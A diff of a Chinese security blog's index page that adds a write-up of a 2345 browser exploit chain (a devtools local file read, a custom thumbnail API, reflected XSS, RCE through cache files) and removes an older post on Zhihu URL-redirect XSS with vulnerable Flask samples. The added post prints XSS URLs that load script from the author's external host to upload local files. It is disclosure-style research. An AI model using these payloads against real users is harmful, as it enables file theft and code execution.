@@ -259,6 +259,124 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/23/2345-Browser-RCE/" itemprop="url">
+                  [浏览器安全系列一] 2345浏览器本地文件读取及远程命令执行
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-23T23:04:35+08:00" content="2016-07-23">
+              2016-07-23
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/23/2345-Browser-RCE/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/23/2345-Browser-RCE/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>案例链接：<a href="http://wooyun.org/bugs/wooyun-2016-0204520" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0204520</a></p>
+<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="0x00-chrome-devtools本地文件读取漏洞"><a href="#0x00-chrome-devtools本地文件读取漏洞" class="headerlink" title="0x00 chrome-devtools本地文件读取漏洞"></a>0x00 chrome-devtools本地文件读取漏洞</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0176314" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0176314</a> 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome-<span class="symbol">devtools:</span>/<span class="regexp">/devtools/bundled</span><span class="regexp">/inspector.html?remoteBase=http:/</span><span class="regexp">/xxx.com/</span>&amp;remoteFrontend=<span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
+<p>就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。我写了一个flask程序进行验证，见测试代码。 在C盘新建一个<code>111.txt</code>并写入内容，运行服务器之后，在2345浏览器打开<code>chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true</code>。本地测试截图：<br><img src="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg" alt=""></p>
+<h4 id="0x01-WebKit系浏览器伪协议调用"><a href="#0x01-WebKit系浏览器伪协议调用" class="headerlink" title="0x01 WebKit系浏览器伪协议调用"></a>0x01 WebKit系浏览器伪协议调用</h4><p>在 <a href="http://www.wooyun.org/bugs/wooyun-2010-0175902" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0175902</a> 中，可以通过<code>location.href=&quot;vbefile:/../../../已知路径/1.js&quot;</code>来执行本地文件<code>1.js</code><br><img src="http://ww1.sinaimg.cn/large/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg" alt=""></p>
+<h3 id="一步一步构造PoC"><a href="#一步一步构造PoC" class="headerlink" title="一步一步构造PoC"></a>一步一步构造PoC</h3><h4 id="0x00-首先我们来思考如何实现读取本地文件"><a href="#0x00-首先我们来思考如何实现读取本地文件" class="headerlink" title="0x00 首先我们来思考如何实现读取本地文件"></a>0x00 首先我们来思考如何实现读取本地文件</h4><p>要让用户自己主动打开：<code>chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://x.xx.com/file/&amp;remoteFrontend=true</code>貌似不太可能，如@gainover提到的，location.href，window.open进行跳转都是会因为安全问题而被浏览器限制，比如：提示Not allowed to load local resource，或打开页面是空白等措施。</p>
+<h4 id="0x01-国产浏览器的毛病"><a href="#0x01-国产浏览器的毛病" class="headerlink" title="0x01 国产浏览器的毛病"></a>0x01 国产浏览器的毛病</h4><p>在很多基于Chromium进行开发的国产浏览器中，厂商都会加入一些自己定制的API来实现一些特定的功能。在2345浏览器中，我发现一个API：<code>chrome.ntp2345.prepareThumbnail</code>，根据名字猜测，这个API应该是用于获取指定URL的HTML页面的截图，也就是说会先访问页面，然后渲染生成缩略图。（因为之前在一个开源项目中实现过类似功能，所以看到这个比较敏感）。进行了尝试之后，发现果然可以执行，并且服务端接收到了发送上来的文件内容，完美地绕过了安全限制！</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome<span class="class">.ntp2345</span><span class="class">.prepareThumbnail</span>(<span class="string">'chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&amp;remoteFrontend=true'</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="0x02-XSS来帮忙"><a href="#0x02-XSS来帮忙" class="headerlink" title="0x02 XSS来帮忙"></a>0x02 XSS来帮忙</h4><p>发现上面的API之后，我里面写了一个页面进行测试，发现还是有一定的限制，那就是这个API在非2345.com及其子域名下执行的话，会直接返回2并且不会访问制定的URL。怎么办？我们来找个XSS不就绕过了？这里有点幸运，我Google了一下<code>site:2345.com inurl:url</code>就找到了一个使用js进行url跳转的XSS，原理类似于@phith0n的<a href="http://wooyun.org/bugs/wooyun-2016-0179329" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0179329</a> ，不受chrome限制的XSSAuditor一个反射型XSS。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="value">://cps.<span class="number">2345</span>.com/go/?bid=<span class="number">2014060633</span>&amp;company_id=<span class="number">33</span>&amp;url=javascript:<span class="function">alert</span>(document.domain);</span><span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp65frrj30j20abju9.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp84i17j30k6098ac5.jpg" alt=""></p>
+<h4 id="0x03-本地文件读取PoC"><a href="#0x03-本地文件读取PoC" class="headerlink" title="0x03 本地文件读取PoC"></a>0x03 本地文件读取PoC</h4><p>服务端代码：<a href="https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240" target="_blank" rel="external">https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240</a></p>
+<p>用户点击一下URL，C盘下的111.txt文件内容就被上传到了服务器上，<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(<span class="number">%27</span>script<span class="number">%27</span>);s.src=<span class="number">%27</span>//a.zhchbin.xyz/file/xss.js<span class="number">%27</span>;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p>
+<p>过程总结：cps.2345.com域名下的XSS，加载/file/xss.js，执行chrome.ntp2345.prepareThumbnail(url)访问chrome-devtools:页面，读取本地文件并上传。</p>
+<h4 id="0x04-我们来实现远程命令执行"><a href="#0x04-我们来实现远程命令执行" class="headerlink" title="0x04 我们来实现远程命令执行"></a>0x04 我们来实现远程命令执行</h4><p>原理：（1）上述的chrome-devtools本地文件读取漏洞不仅能读取文件，还能读取文件列表！（2）我们可以通过浏览器的cache机制，写入我们指定的内容到浏览器的cache目录中（3）可以利用WebKit系浏览器伪协议调用执行cache文件。</p>
+<p>2345浏览器的默认cache目录在：C:\Users\%USERNAME%\AppData\Local\2345Explorer\User Data\Default\Cache。要执行这个目录下的cache文件，我们要解决两个问题，首先是找出当前系统的用户名，第二是定位到我们的恶意cache文件。第一个问题，我们可以通过读取C:\Users这个目录下的文件列表，得到用户列表。然后针对每个用户，执行以下的操作来定位恶意cache文件：获取cache目录下的文件列表，保存在localStorage中，然后利用插入img的方式写入恶意cache文件，完成后再获取一次cache目录下的文件列表，找出第二次集合中新增加的文件，上传到服务器中，前端跳转到执行页面，指定iframe的src为<code>vbefile:/../../../../../../../../Users/xxx/AppData/Local/2345Explorer/User Data/Default/Cache/f_xxxx</code>，从而达到命令执行的效果。</p>
+<p>服务端代码：<a href="https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196" target="_blank" rel="external">https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196</a><br>用户点击：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://cps.2345.com/go/?bid=2014060633&amp;company_id=33&amp;url=javascript:s=document.createElement(<span class="number">%27</span>script<span class="number">%27</span>);s.src=<span class="number">%27</span>//a.zhchbin.xyz/xss.js<span class="number">%27</span>;document.body.appendChild(s);//</span><br></pre></td></tr></table></figure></p>
+<p>测试说明：因为请求有时序依赖，所以里面用了5000毫秒的等待时间，来确保顺序的正确性。测试时可以在修改一下里面的域名变成本地的地址，然后运行。</p>
+<p><img src="http://ww4.sinaimg.cn/large/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/06/25/loneliness/" itemprop="url">
                   感受孤独
                 </a>
@@ -341,127 +459,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/04/09/Problems-Caused-by-URL-Redirection/" itemprop="url">
-                  一个URL跳转引发的一系列“惨案”
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-04-09T13:45:01+08:00" content="2016-04-09">
-              2016-04-09
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/04/09/Problems-Caused-by-URL-Redirection/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/04/09/Problems-Caused-by-URL-Redirection/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在知乎的题目和答案中，插入的链接都会变成<code>https://link.zhihu.com/target=xxx</code>的形式进行URL跳转，如下图。然而这个看似简单的功能的实现上，曾引发过一系列的问题，过程挺精彩，所以我就来做个总结，以重新体验一下这个过程。声明：以下小节中提到的问题均来自WooYun已经公开的漏洞，复现的代码也是纯属我个人YY。<br><img src="/images/20160409140054.png" alt="ZhihuURLRedirect"></p>
-<h2 id="0x00-没有任何过滤"><a href="#0x00-没有任何过滤" class="headerlink" title="0x00 没有任何过滤"></a>0x00 没有任何过滤</h2><p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0171240" target="_blank" rel="external">知乎 URL 跳转造成的 XSS</a></p>
-<p>猜测知乎可能的实现方式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = request.args.get(<span class="string">'target'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;window.location.href = "%s"&lt;/script&gt;'''</span> % (target)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
-<p>在上面这个实现中，我们可以发现对于<code>&quot;</code>并没有进行转义，因此我们可以传入<code>&quot;</code>来闭合前面的双引号，然后再插入我们的JS代码。运行上面的程序<code>python server.py</code>，然后使用curl请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">'127.0.0.1:5000/?target=";alert(1);window.location.href="http://www.zhihu.com'</span></span><br><span class="line">&lt;script&gt;window.location.href = <span class="string">""</span>;alert(<span class="number">1</span>);window.location.href=<span class="string">"http://www.zhihu.com"</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/20160409141842.png" alt="XSS_1"></p>
-<h2 id="0x01-对参数做了urlencode编码"><a href="#0x01-对参数做了urlencode编码" class="headerlink" title="0x01 对参数做了urlencode编码"></a>0x01 对参数做了urlencode编码</h2><p>在上面的漏洞报告之后，（猜测）知乎的工程师按照了洞主给出的修复方案进行代码的修改，修改后的代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = request.args.get(<span class="string">'target'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;</span><br><span class="line">var URI="%s";</span><br><span class="line">window.location.href = decodeURIComponent(URI);</span><br><span class="line">&lt;/script&gt;'''</span> % (urllib.quote(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
-<p>现在，我们如果在target参数中传入<code>&quot;</code>，则先会被转义成<code>%22</code>插入在页面中，从而无法闭合之前的双引号。看似一个挺好的的解决方案吧，然而，却还不够。案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0179329" target="_blank" rel="external">知乎某处XSS+刷粉超详细漏洞技术分析</a>。我们可以看到后台将输入的target参数传入给URI参数，解码以后赋值于location.href。问题解决了？没有，可以利用JavaScript:伪协议执行js代码，如<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?<span class="keyword">target</span>=javascript:alert(1);</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/20160409143927.png" alt="XSS_2"></p>
-<p>强烈推荐仔细阅读这个案例哦，洞主的分析利用过程保证你看了会觉得很有收获。</p>
-<h2 id="0x02-使用WTForm进行URL校验"><a href="#0x02-使用WTForm进行URL校验" class="headerlink" title="0x02 使用WTForm进行URL校验"></a>0x02 使用WTForm进行URL校验</h2><p>（猜测开发内心OS）既然如此，Python不是有个叫做<code>WTForm</code>的库可以帮我们校验用户的输入是否合法吗？我们可以利用里面的<a href="http://wtforms.readthedocs.org/en/latest/validators.html?highlight=URL#wtforms.validators.URL" target="_blank" rel="external">wtforms.validators.URL</a>进行URL的检查，这样子用户的输入该合法了吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField</span><br><span class="line"><span class="keyword">from</span> wtforms.form <span class="keyword">import</span> Form</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired, URL</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlForm</span><span class="params">(Form)</span>:</span></span><br><span class="line">    target = StringField(validators=[DataRequired(), URL()])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = UrlForm(request.args)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> form.validate():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Bad Boy!"</span></span><br><span class="line"></span><br><span class="line">    target = form.target.data.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;</span><br><span class="line">var URI="%s";</span><br><span class="line">window.location.href = decodeURIComponent(URI);</span><br><span class="line">&lt;/script&gt;'''</span> % (urllib.quote(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
-<p>这里也有可能是开发自己写正则进行匹配，问题本质上都是一样的，正则写的不好。上面的写法虽然已经能过滤到前面提到的情况，然而，WTForm的正则过滤并没有写好，导致继续被XSS。如下的URL：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5000</span>/?target=javascript:<span class="regexp">//www</span>.baidu.com/<span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%A8alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/20160409151521.png" alt="XSS_3"></p>
-<p>具体分析见案例<a href="http://www.wooyun.org/bugs/wooyun-2016-0182145" target="_blank" rel="external">知乎某处XSS导致刷粉</a>及<a href="http://drops.wooyun.org/papers/13058" target="_blank" rel="external">从WTForm的URLXSS谈开源组件的安全性</a></p>
-<h2 id="0x03-除了XSS之外的一个彩蛋"><a href="#0x03-除了XSS之外的一个彩蛋" class="headerlink" title="0x03 除了XSS之外的一个彩蛋"></a>0x03 除了XSS之外的一个彩蛋</h2><p>这里本身其实是一个任意URL调整，可以在某些实现不严格的OAuth2.0的过程中利用偷取用户的授权code，然后使用用户的身份进行登录哦。在我之前的博客已经分析过这个问题，这里就不再写了。案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="external">微博上你点我链接我就上你绑定过的知乎账号</a></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做一个程序员不容易啊！请善待我们。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -502,7 +504,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">18</span>
+              <span class="site-state-item-count">19</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
